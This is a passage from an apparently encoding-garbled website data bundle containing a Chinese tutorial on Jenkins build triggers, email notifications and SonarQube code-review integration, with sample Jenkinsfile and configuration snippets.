</tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nè¿éçåæ°é½ä¸º Jenkins çåæ°ï¼å·ä½åæ°å¨ Jenkins ç³»ç»éç½®éå¯ä»¥çå°ï¼ç¹å»å¦ä¸çé®å·å°±è¡ã\n\n\n\n\n\næ·»å  postï¼post æææ¯æå»ºåæä½ï¼post å¯ä»¥æ ¹æ® stage çç»ææ§è¡ä¸åçé»è¾ï¼æ¯å¦ stages éé¢é½æ§è¡å®æï¼ä»ä¼èµ° post éç success ä»£ç ï¼å¦æå¤±è´¥ä¼èµ° failure ä»£ç ãè post çè¯­æ³è¯¥å¦ä½åï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ ä¸­çå°ã\n\n\n\n * Always run, regardless of build status æ è®ºæå»ºçç»æå¦ä½é½ä¼æ§è¡\n * Run if the build status is "Failure" æå»ºå¤±è´¥è¿è¡\n * Run if the build status is "Success" or hasnt been set yet æå»ºæåè¿è¡\n\nè³äºï¼é®ä»¶çåå®¹ï¼å¯ä»¥å¨çæ®µçæå¨ä¸­æ¥åºæ¥\n\n\n\n    post {\n        always {\n            emailext(\n                # å¯ä»¥ä½¿ç¨ jenkins éé¢çåæ°\n                subject: \'æå»ºéç¥ï¼${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                # è¯»å email.html æä»¶\n                body: \'${FILE,path="email.html"}\',\n                # é®ä»¶çæ¶ä»¶äºº\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${FILE,path="PATH"} å¯ä»¥å¨ç³»ç»éç½®ä¸­äºè§£\n\n\n\nç¶åå»æå»ºä½ çé¡¹ç®ï¼å°±å¯ä»¥æ¶å° æå»ºé¡¹ç®çé®ä»¶äºã\n\n\n# jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼\n\nSonarQube æ¯ä¸ä¸ªç¨äºç®¡çä»£ç è´¨éçå¼æ¾å¹³å°ï¼å¯ä»¥å¿«éçå®ä½ä»£ç ä¸­æ½å¨çæèææ¾çéè¯¯ãç®åæ¯æ java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy ç­äºåå ç§ç¼ç¨è¯­è¨çä»£ç è´¨éç®¡çä¸æ£æµãå®ç½ï¼https://www.sonarqube.org/\n\nè½¯ä»¶          çæ¬\nJDK         1.8\nmysql       8.0\nSonarQube   6.7.4\n\nä¸è½½ sonar åç¼©åï¼https://www.sonarqube.org/downloads/\n\n# è§£å \nunzip sonarqube-6.7.4.zip\n# åå»ºsonarç¨æ·ï¼å¿é¡»sonarç¨äºå¯å¨ï¼å¦åæ¥é\nuseradd sonar \n# æ´æ¹sonarç®å½åæä»¶æé\nchown -R sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¿®æ¹ sonar éç½®æä»¶\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useUnicode=true&characterEncoding=utf8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai&rewriteBatchedStatements=true&useConfigs=maxPerformance\n\n\n1\n2\n3\n4\n\n\nå¯å¨ sonar\n\ncd /opt/software/sonar/\n# å¯å¨\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# æ¥çç¶æ\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# åæ­¢\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# æ¥çæ¥å¿\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 ä»¥åä¸æ¯æ mysqlï¼åªæ¯æ h2ãmssqlãpostgresql ï¼7.9 ä»¥ä¸ä¹åªæ¯æ mysql5.7ï¼æä»¥è¿éå°±ä¸å¨ç»§ç»­äºï¼å¤§è´è¯´æ¸æ¥å°±å¥½ï¼å½å®è£å¥½åè®¿é® web é¡µé¢ï¼é»è®¤ 9000 ç«¯å£ï¼å¾å°ä¸ä¸ª token è®°å½ä¸æ¥ã\n\n\n\n1. å¨ Jenkins ä¸­å®è£ SonarQube Scanner æä»¶\n2. å¨ Jenkins->Manager Jenkins->Global Tool Configuration->SonarQube Scanner-> æ°å¢ SonarQube Scanner\n\n1. å¡«å¥ Nameï¼åå­å¯ä»¥èªå·±éä¾¿èµ·\n2. å¾é Install automatically\n3. éæ©å®è£ççæ¬\n4. ç¹å»åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n3. å¨ Jenkins->Manager Jenkins->Configure System->SonarQube servers->Add SonarQube\n\n1. å¡«å¥ Nameï¼è¯¥åå­å¯ä»¥éä¾¿èµ·\n2. å¡«åå®è£ SonarQube ç web å°å IP:PORT\n3. æ·»å è¯ä¹¦ï¼è¯¥è¯ä¹¦å°±æ¯è®¿é® SonarQube è·åå°çtokenï¼ä¹å¯ä»¥å¨Jenkinsçå¨å±å­è¯éå»æ·»å è¿ä¸ªè¯ä¹¦ï¼ä½ç±»åéè¦æ¯ Secret text\n4. åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n4. éç»ææ§é¡¹ç®æ£æ¥ï¼å°é¡¹ç®éç½®ä¸­æ¾å°æå»ºï¼å¨æ­£å¸¸çæå»ºé¡¹ç®åå½åå¯ä»¥å¢å æå»ºæ­¥éª¤ï¼ç¶ååä¸æéé¡¹ä¸­æ¾å° Execute SonarQube Scanner\n\n1. å¡«åTask to runï¼æ§è¡ SonarQube çå½ä»¤ï¼è¾å¥ scanï¼è§¦åä»£ç æ«æä»¥åæ£æµï¼\n2. ä»£ç éè¦çJDKç¯å¢ï¼è¿ä¸ªJDKç¯å¢æ¯å¨å¨å±éç½®ä¸­éç½®å¾å°ç\n3. å¨ Analysis properties å¡«å¦åå®¹\n\n# must be unique in a given SonarQube instanceï¼é¡¹ç®æ è®°\nsonar.projectKey=web_demo\n# this is the name and version displayed in the SonarQube UI. Was mandatoryprior to SonarQube 6.1.ï¼é¡¹ç®åç§°\nsonar.projectName=web_demo\n# çæ¬\nsonar.projectVersion=1.0\n# Path is relative to the sonar-project.properties file. Replace "\\" by "/" on\nWindows.\n# This property is optional if sonar.modules is set. æ«æä»£ç çè·¯å¾ . ä»£è¡¨å½åé¡¹ç®æ ¹ç®å½ä¸æ«æææä»£ç åæä»¶ï¼ä¹å¯ä»¥ç´æ¥æ«ææå®åä»£ç ï¼å¦ /src/main/**\nsonar.sources=.\n# æé¤çä¸äºæä»¶ä¸æ«æ\nsonar.exclusions=**/test/**,**/target/**\n# jdkçæ¬\nsonar.java.source=1.8\nsonar.java.target=1.8\n# Encoding of the source code. Default is default system encodingï¼ç¼ç æ ¼å¼\nsonar.sourceEncoding=UTF-8\n\n4.åºç¨å¹¶ä¿å­åæå»ºé¡¹ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. æµæ°´çº¿é¡¹ç®æ·»å  SonarQube åè½ï¼å¯ä»¥æåå®¹æ·»å å°é¡¹ç®ä¸­ï¼é²æ­¢ jenkins æå¤çå´©æºï¼å¯¼è´éç½®ä¸¢å¤±\n\n1. å¨é¡¹ç®ä¸­æ ¹è·¯å¾ä¸æ°å»º sonar-project.propertiesï¼å¹¶æåå®¹å¤å¶è¿æ¥\n2. å°é¡¹ç®ä¸­ç Jenkinsfile ä¸­ç¼ååå®¹\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master åæ¯çäºæ åæ°æ¯=${branch}\'\n                checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # ä»£ç æ£æ¥ï¼å¯ä»¥æè¯¥æ­¥éª¤æ·»å å°ä»»æä½ç½®\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' è¿éåçæ¯å¨jenkins->Global Tool Configuration->SonarQube Scanner->æ°å¢çSonarQube ScannerçName\n                    scannerHome = tool \'sonar-scanner\'\n                }\n                # () éçåå®¹æ¯å¨ jenkins->Configure System->SonarQube servers->éç Name\n                withSonarQubeEnv(\'sonarqube6.7.4\') {\n                    # è¿éæ¯ jenkins å¨éç½® SonarQube Scannerçæ¶åå®è£çå·¥å·ï¼ä»èªå·±å®è£çä¸éè¦æä»¬ç®¡\n                    sh "${scannerHome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'æå»ºéç¥ï¼${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                body: \'${FILE,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. æäº¤åå°±å¯ä»¥å° jenkins å»æå»ºé¡¹ç®ï¼ç»æè¦å» SonarQube web å»ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',normalizedContent:'# åç½®è§¦åå¨\n\njenkins åç½® 4 ç§æå»ºè§¦åå¨ï¼\n\n * è§¦åè¿ç¨æå»ºï¼éè¿ä¸ä¸ªè¿ç¨å°åè§¦åé¡¹ç®çæ§è¡\n * å¶ä»å·¥ç¨æå»ºåè§¦åï¼build after other projects are buildï¼ï¼å°±æ¯éè¦åé¢ä¸ä¸ªé¡¹ç®æå»ºå®æåè§¦åæçé¡¹ç®æå»º\n * å®æ¶æå»ºï¼build periodicallyï¼ï¼é¡¾åæä¹å°±æ¯ ç±»ä¼¼äº corn è¡¨è¾¾å¼ï¼å®æ¶æ§è¡\n * è½®è¯¢ scmï¼poll scmï¼ï¼ä¼å®æ¶æ«ææ¬å°ä»£ç ä»åºæ¯å¦æåæ´ï¼å¦æä»£ç æåæ´å°±è§¦åé¡¹ç®æå»º\n\n\n# è¿ç¨æå»º\n\nå¨é¡¹ç®ä¸­çéç½®ä¸­ï¼æå»ºè§¦åå¨éä¸­è¿ç¨æå»ºã\n\n\n\néè¿æµè§å¨è®¿é® http://192.168.81.102:7777/job/test01/build?token=6666 è¿è¡é¡¹ç®æå»º\n\n\n# å¶ä»å·¥ç¨æå»ºåè§¦å\n\n\n\n\n\nåºç¨ä¿å­åï¼å°±å¯ä»¥æå»º maven_project äºã\n\n\n# å®æ¶æå»º\n\nå®æ¶å­ç¬¦ä¸²ä»å·¦å¾å³åå«ä¸ºï¼ å æ¶ æ¥ æ å¨\nä¸äºå®æ¶è¡¨è¾¾å¼çä¾å­ï¼\n\næ¯30åéæå»ºä¸æ¬¡ï¼hä»£è¡¨å½¢å(ä»£è¡¨å°æ¶ï¼æµè¯ç¨ *)\nh/30 * * * * 10:02 10:32\næ¯2ä¸ªå°æ¶æå»ºä¸æ¬¡: \nh h/2 * * *\næ¯å¤©ç8ç¹ï¼12ç¹ï¼22ç¹ï¼ä¸å¤©æå»º3æ¬¡ï¼ (å¤ä¸ªæ¶é´ç¹ä¸­é´ç¨éå·éå¼) \n0 8,12,22 * * *\næ¯å¤©ä¸­å12ç¹å®æ¶æå»ºä¸æ¬¡ \nh 12 * * *\næ¯å¤©ä¸å18ç¹å®æ¶æå»ºä¸æ¬¡ \nh 18 * * *\nå¨æ¯ä¸ªå°æ¶çååä¸ªå°æ¶åçæ¯10åé h(0-29)/10 * * * *\næ¯ä¸¤å°æ¶ä¸æ¬¡ï¼æ¯ä¸ªå·¥ä½æ¥ä¸å9ç¹å°ä¸å5ç¹(ä¹è®¸æ¯ä¸å10:38ï¼ä¸å12:38ï¼ä¸å2:38ï¼ä¸å4:38) h h(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# è½®è¯¢ scm\n\nè¯¥æå»ºè§¦åå¨ï¼jenkins ä¼å®æ¶æ«ææ¬å°æ´ä¸ªé¡¹ç®çä»£ç ï¼å¢å¤§ç³»ç»çå¼éï¼ä¸å»ºè®®ä½¿ç¨ã\n\n\n\n\n# git hook èªå¨è§¦åæå»º\n\nå¨ jenkins çåç½®æå»ºè§¦åå¨ä¸­ï¼è½®è¯¢ scm å¯ä»¥å®ç° gitlab ä»£ç æ´æ°ï¼é¡¹ç®èªå¨æå»ºï¼ä½æ¯è¯¥æ¹æ¡çæ§è½ä¸ä½³ãé£ææ²¡ææ´å¥½çæ¹æ¡å¢ï¼ æçãå°±æ¯å©ç¨ gitlab ç webhook å®ç°ä»£ç  push å°ä»åºï¼ç«å³è§¦åé¡¹ç®èªå¨æå»ºã\n\n\n\n\n# å®è£ gitlab hook æä»¶\n\néè¦å®è£ä¸¤ä¸ªæä»¶ï¼gitlab hook å gitlabï¼å®è£å¥½åå¨é¡¹ç®éç½®çæå»ºè§¦åå¨ä¸­ï¼ä¼å¤ä¸ä¸ªéé¡¹\n\n\n\nå³äº gitlab ä¹åçæä½è¯·ç¾åº¦ï¼æè¿éä½¿ç¨çæ¯ giteaã\n\ngitea éè¦ä¸è½½ generic webhook trigger æä»¶ï¼å®è£åå°é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\néç½®å®æåå°±å¯ä»¥æµè¯äºï¼åªè¦æäº¤äºä»£ç å°±ä¼æå»ºé¡¹ç®ã\n\n\n# jenkins çåæ°åæå»º\n\nææ¶å¨é¡¹ç®æå»ºçè¿ç¨ä¸­ï¼æä»¬éè¦æ ¹æ®ç¨æ·çè¾å¥å¨æä¼ å¥ä¸äºåæ°ï¼ä»èå½±åæ´ä¸ªæå»ºç»æï¼è¿æ¶æä»¬å¯ä»¥ä½¿ç¨åæ°åæå»ºã\n\njenkins æ¯æéå¸¸ä¸°å¯çåæ°ç±»å\n\n\n\n\n# string parameter\n\nè¿æ ·çæ¹å¼åªè½éç¨äº pipeline é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nè¿ç§æ¹å¼è¾å¥åªä¸ªåæ¯ï¼å°±æå»ºåªä¸ªåæ¯\n\n\n# éç½®é®ç®±æå¡å¨åéæå»ºç»æ\n\n\n# å®è£ email extension æä»¶\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nå¯ä»¥æµè¯åé\n\n> å¦æ jenkins æ¥éï¼ can\'t send command to smtp host; æå¯è½æ¯ç®¡çåçé®ç®±æ²¡æå¡«åæèåè®¤è¯èçé®ç®±ä¸ç¸åã\n\n\n# åå¤é®ä»¶åå®¹\n\nå¨é¡¹ç®æ ¹ç®å½ç¼å email.htmlï¼å¹¶ææä»¶æ¨é git\n\n<!doctype html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>${env, var="job_name"}-ç¬¬${build_number}æ¬¡æå»ºæ¥å¿</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n    <tr>\n        <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000ff">æå»ºç»æ - ${build_status}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0b610b">æå»ºä¿¡æ¯</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${project_name}</li>\n                <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${build_number}æ¬¡æå»º</li>\n                <li>è§¦ååå ï¼&nbsp;${cause}</li>\n                <li>æå»ºæ¥å¿ï¼&nbsp;\n                    <a href="${build_url}console">${build_url}console</a>\n                </li>\n                <li>æå»º&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                    <a href="${build_url}">${build_url}</a>\n                </li>\n                <li>å·¥ä½ç®å½&nbsp;ï¼&nbsp;\n                    <a href="${project_url}ws">${project_url}ws</a>\n                </li>\n                <li>é¡¹ç®&nbsp;&nbsp;url&nbsp;ï¼&nbsp;\n                    <a href="${project_url}">${project_url}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">changes since last successful build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>åå²åæ´è®°å½ : <a href="${project_url}changes">${project_url}changes</a></li>\n            </ul>\n            ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>failed test results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                $failed_tests\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">æå»ºæ¥å¿ (æå 100è¡):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: courier new">\n                ${build_log,maxlines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\nè¿éçåæ°é½ä¸º jenkins çåæ°ï¼å·ä½åæ°å¨ jenkins ç³»ç»éç½®éå¯ä»¥çå°ï¼ç¹å»å¦ä¸çé®å·å°±è¡ã\n\n\n\n\n\næ·»å  postï¼post æææ¯æå»ºåæä½ï¼post å¯ä»¥æ ¹æ® stage çç»ææ§è¡ä¸åçé»è¾ï¼æ¯å¦ stages éé¢é½æ§è¡å®æï¼ä»ä¼èµ° post éç success ä»£ç ï¼å¦æå¤±è´¥ä¼èµ° failure ä»£ç ãè post çè¯­æ³è¯¥å¦ä½åï¼å¯ä»¥å° æµæ°´çº¿è¯­æ³ ä¸­çå°ã\n\n\n\n * always run, regardless of build status æ è®ºæå»ºçç»æå¦ä½é½ä¼æ§è¡\n * run if the build status is "failure" æå»ºå¤±è´¥è¿è¡\n * run if the build status is "success" or hasnt been set yet æå»ºæåè¿è¡\n\nè³äºï¼é®ä»¶çåå®¹ï¼å¯ä»¥å¨çæ®µçæå¨ä¸­æ¥åºæ¥\n\n\n\n    post {\n        always {\n            emailext(\n                # å¯ä»¥ä½¿ç¨ jenkins éé¢çåæ°\n                subject: \'æå»ºéç¥ï¼${project_name} - build # ${build_number} - ${build_status}!\',\n                # è¯»å email.html æä»¶\n                body: \'${file,path="email.html"}\',\n                # é®ä»¶çæ¶ä»¶äºº\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${file,path="path"} å¯ä»¥å¨ç³»ç»éç½®ä¸­äºè§£\n\n\n\nç¶åå»æå»ºä½ çé¡¹ç®ï¼å°±å¯ä»¥æ¶å° æå»ºé¡¹ç®çé®ä»¶äºã\n\n\n# jenkins éç½® sonarqubeï¼ä»£ç å®¡æ¥ï¼\n\nsonarqube æ¯ä¸ä¸ªç¨äºç®¡çä»£ç è´¨éçå¼æ¾å¹³å°ï¼å¯ä»¥å¿«éçå®ä½ä»£ç ä¸­æ½å¨çæèææ¾çéè¯¯ãç®åæ¯æ java,c#,c/c++,python,pl/sql,cobol,javascrip,groovy ç­äºåå ç§ç¼ç¨è¯­è¨çä»£ç è´¨éç®¡çä¸æ£æµãå®ç½ï¼https://www.sonarqube.org/\n\nè½¯ä»¶          çæ¬\njdk         1.8\nmysql       8.0\nsonarqube   6.7.4\n\nä¸è½½ sonar åç¼©åï¼https://www.sonarqube.org/downloads/\n\n# è§£å \nunzip sonarqube-6.7.4.zip\n# åå»ºsonarç¨æ·ï¼å¿é¡»sonarç¨äºå¯å¨ï¼å¦åæ¥é\nuseradd sonar \n# æ´æ¹sonarç®å½åæä»¶æé\nchown -r sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¿®æ¹ sonar éç½®æä»¶\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useunicode=true&characterencoding=utf8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai&rewritebatchedstatements=true&useconfigs=maxperformance\n\n\n1\n2\n3\n4\n\n\nå¯å¨ sonar\n\ncd /opt/software/sonar/\n# å¯å¨\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# æ¥çç¶æ\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# åæ­¢\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# æ¥çæ¥å¿\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 ä»¥åä¸æ¯æ mysqlï¼åªæ¯æ h2ãmssqlãpostgresql ï¼7.9 ä»¥ä¸ä¹åªæ¯æ mysql5.7ï¼æä»¥è¿éå°±ä¸å¨ç»§ç»­äºï¼å¤§è´è¯´æ¸æ¥å°±å¥½ï¼å½å®è£å¥½åè®¿é® web é¡µé¢ï¼é»è®¤ 9000 ç«¯å£ï¼å¾å°ä¸ä¸ª token è®°å½ä¸æ¥ã\n\n\n\n1. å¨ jenkins ä¸­å®è£ sonarqube scanner æä»¶\n2. å¨ jenkins->manager jenkins->global tool configuration->sonarqube scanner-> æ°å¢ sonarqube scanner\n\n1. å¡«å¥ nameï¼åå­å¯ä»¥èªå·±éä¾¿èµ·\n2. å¾é install automatically\n3. éæ©å®è£ççæ¬\n4. ç¹å»åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n3. å¨ jenkins->manager jenkins->configure system->sonarqube servers->add sonarqube\n\n1. å¡«å¥ nameï¼è¯¥åå­å¯ä»¥éä¾¿èµ·\n2. å¡«åå®è£ sonarqube ç web å°å ip:port\n3. æ·»å è¯ä¹¦ï¼è¯¥è¯ä¹¦å°±æ¯è®¿é® sonarqube è·åå°çtokenï¼ä¹å¯ä»¥å¨jenkinsçå¨å±å­è¯éå»æ·»å è¿ä¸ªè¯ä¹¦ï¼ä½ç±»åéè¦æ¯ secret text\n4. åºç¨å¹¶ä¿å­\n\n\n1\n2\n3\n4\n\n\n4. éç»ææ§é¡¹ç®æ£æ¥ï¼å°é¡¹ç®éç½®ä¸­æ¾å°æå»ºï¼å¨æ­£å¸¸çæå»ºé¡¹ç®åå½åå¯ä»¥å¢å æå»ºæ­¥éª¤ï¼ç¶ååä¸æéé¡¹ä¸­æ¾å° execute sonarqube scanner\n\n1. å¡«åtask to runï¼æ§è¡ sonarqube çå½ä»¤ï¼è¾å¥ scanï¼è§¦åä»£ç æ«æä»¥åæ£æµï¼\n2. ä»£ç éè¦çjdkç¯å¢ï¼è¿ä¸ªjdkç¯å¢æ¯å¨å¨å±éç½®ä¸­éç½®å¾å°ç\n3. å¨ analysis properties å¡«å¦åå®¹\n\n# must be unique in a given sonarqube instanceï¼é¡¹ç®æ è®°\nsonar.projectkey=web_demo\n# this is the name and version displayed in the sonarqube ui. was mandatoryprior to sonarqube 6.1.ï¼é¡¹ç®åç§°\nsonar.projectname=web_demo\n# çæ¬\nsonar.projectversion=1.0\n# path is relative to the sonar-project.properties file. replace "\\" by "/" on\nwindows.\n# this property is optional if sonar.modules is set. æ«æä»£ç çè·¯å¾ . ä»£è¡¨å½åé¡¹ç®æ ¹ç®å½ä¸æ«æææä»£ç åæä»¶ï¼ä¹å¯ä»¥ç´æ¥æ«ææå®åä»£ç ï¼å¦ /src/main/**\nsonar.sources=.\n# æé¤çä¸äºæä»¶ä¸æ«æ\nsonar.exclusions=**/test/**,**/target/**\n# jdkçæ¬\nsonar.java.source=1.8\nsonar.java.target=1.8\n# encoding of the source code. default is default system encodingï¼ç¼ç æ ¼å¼\nsonar.sourceencoding=utf-8\n\n4.åºç¨å¹¶ä¿å­åæå»ºé¡¹ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. æµæ°´çº¿é¡¹ç®æ·»å  sonarqube åè½ï¼å¯ä»¥æåå®¹æ·»å å°é¡¹ç®ä¸­ï¼é²æ­¢ jenkins æå¤çå´©æºï¼å¯¼è´éç½®ä¸¢å¤±\n\n1. å¨é¡¹ç®ä¸­æ ¹è·¯å¾ä¸æ°å»º sonar-project.propertiesï¼å¹¶æåå®¹å¤å¶è¿æ¥\n2. å°é¡¹ç®ä¸­ç jenkinsfile ä¸­ç¼ååå®¹\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master åæ¯çäºæ åæ°æ¯=${branch}\'\n                checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # ä»£ç æ£æ¥ï¼å¯ä»¥æè¯¥æ­¥éª¤æ·»å å°ä»»æä½ç½®\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' è¿éåçæ¯å¨jenkins->global tool configuration->sonarqube scanner->æ°å¢çsonarqube scannerçname\n                    scannerhome = tool \'sonar-scanner\'\n                }\n                # () éçåå®¹æ¯å¨ jenkins->configure system->sonarqube servers->éç name\n                withsonarqubeenv(\'sonarqube6.7.4\') {\n                    # è¿éæ¯ jenkins å¨éç½® sonarqube scannerçæ¶åå®è£çå·¥å·ï¼ä»èªå·±å®è£çä¸éè¦æä»¬ç®¡\n                    sh "${scannerhome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'æå»ºéç¥ï¼${project_name} - build # ${build_number} - ${build_status}!\',\n                body: \'${file,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. æäº¤åå°±å¯ä»¥å° jenkins å»æå»ºé¡¹ç®ï¼ç»æè¦å» sonarqube web å»ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',charsets:{cjk:!0}},{title:"kubernetes(ä¸) æ¦å¿µåä»ç»",frontmatter:{title:"kubernetes(ä¸) æ¦å¿µåä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/600.kubernetes(%E4%B8%80)%20%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"01.è¿ç»´/60.Kubernetes/600.kubernetes(ä¸) æ¦å¿µåä»ç».md",key:"v-4d0793a3",path:"/kubernetes/600/",headers:[{level:2,title:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å",slug:"_1-1-åºç¨é¨ç½²æ¹å¼æ¼å",normalizedTitle:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å",charIndex:2},{level:2,title:"1.2 kubernetesç®ä»",slug:"_1-2-kubernetesç®ä»",normalizedTitle:"1.2 kubernetes ç®ä»",charIndex:661},{level:2,title:"1.3 kubernetesç»ä»¶",slug:"_1-3-kubernetesç»ä»¶",normalizedTitle:"1.3 kubernetes ç»ä»¶",charIndex:1085},{level:2,title:"1.4 kubernetesæ¦å¿µ",slug:"_1-4-kubernetesæ¦å¿µ",normalizedTitle:"1.4 kubernetes æ¦å¿µ",charIndex:2074}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å 1.2 kubernetesç®ä» 1.3 